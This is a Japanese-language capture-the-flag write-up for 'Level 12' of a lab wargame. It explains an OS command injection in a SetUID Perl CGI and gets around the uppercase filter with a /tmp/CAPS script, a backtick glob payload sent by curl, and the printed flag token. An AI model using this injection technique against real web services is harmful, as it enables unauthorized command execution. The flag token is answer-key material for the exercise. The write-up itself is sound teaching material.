# Level 12

## 目的
ユーザー `flag12` の権限で `getflag` コマンドを実行し、フラグを取得する。

## 手順と解説

### 1. 調査

`level12` ユーザーでログイン後、SetUIDされたPerlスクリプト `level12.pl` を確認します。

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
# ...
sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;  # 小文字を大文字に変換
  $xx =~ s/\s.*//;     # 空白以降を削除
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  # ...
}
```

このスクリプトは `localhost:4646` で動作するCGIで、パラメータ `x` を受け取ります。
`x` は以下の処理を経て、シェルコマンド（`egrep`）の一部として実行されます。

1.  **大文字化**: すべての小文字が大文字に変換されます (`tr/a-z/A-Z/`)。
2.  **トリミング**: 最初の空白以降が削除されます。
3.  **コマンド実行**: `` `egrep "^$xx" /tmp/xd 2>&1` ``

バッククォート `` ` `` 内で変数が展開されるため、**OSコマンドインジェクション**の脆弱性があります。
しかし、入力が大文字に変換されるため、通常のコマンド（`getflag` や `/bin/sh` など）は小文字を含んでおり、そのままでは実行できません。

### 2. エクスプロイト（攻撃）

以下の手法で制限を回避します。

1.  **大文字のファイル名でスクリプトを作成**:
    `/tmp/CAPS` という名前のスクリプトを作成し、その中に実行したいコマンド（`getflag`）を記述します。
    ファイル名を大文字にすることで、Perlの大文字変換の影響を受けずに済みます。

2.  **ワイルドカード（グロブ）の利用**:
    コマンドインジェクションでこのスクリプトを実行するために、パス指定にワイルドカード `*` を使用します。
    `/*/CAPS` と指定すると、シェルは `/tmp/CAPS` （および他の一致するファイル）に展開します。
    これにより、`/tmp`（小文字が含まれるパス）を明示的に書く必要がなくなります。

**実行手順:**

1.  攻撃用スクリプトの作成:
    ```bash
    echo "#!/bin/sh" > /tmp/CAPS
    echo "getflag > /tmp/flag12" >> /tmp/CAPS
    chmod +x /tmp/CAPS
    ```

2.  攻撃リクエストの送信:
    `x` パラメータとして `` `/*/CAPS` `` を渡します。
    Perl側で大文字変換されても `` `/*/CAPS` `` のまま変わりません。
    シェル上でバッククォートが評価され、`/*/CAPS` が展開・実行されます。

    ```bash
    curl "http://localhost:4646/?x=\`/*/CAPS\`"
    ```

### 3. 結果

`/tmp/flag12` にフラグが出力されます。

```bash
cat /tmp/flag12
```
出力:
```text
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

## 結果

### トークン (Flag)
`g1qKMiRpXf53AWhDaU7FEkczr`

```